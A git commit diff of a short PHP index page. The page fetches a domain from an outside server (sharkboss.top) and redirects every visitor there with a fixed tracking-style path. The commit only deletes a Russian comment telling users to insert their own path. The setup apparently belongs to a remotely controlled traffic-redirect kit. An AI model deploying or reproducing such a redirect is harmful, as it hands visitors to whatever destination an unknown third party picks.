bf3aee056034e9c1238c782abf445d02bc79390d
oficailsite <projoneyq@gmail.com>
2025-04-02 00:08:53 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?
 $pdomain = file_get_contents('https://sharkboss.top/share/get_redir.php');
-header('Location: '.$pdomain.'/go/y284y224/63b4'); // Замените данные после /go/ на свои
+header('Location: '.$pdomain.'/go/y284y224/63b4');
 ?>
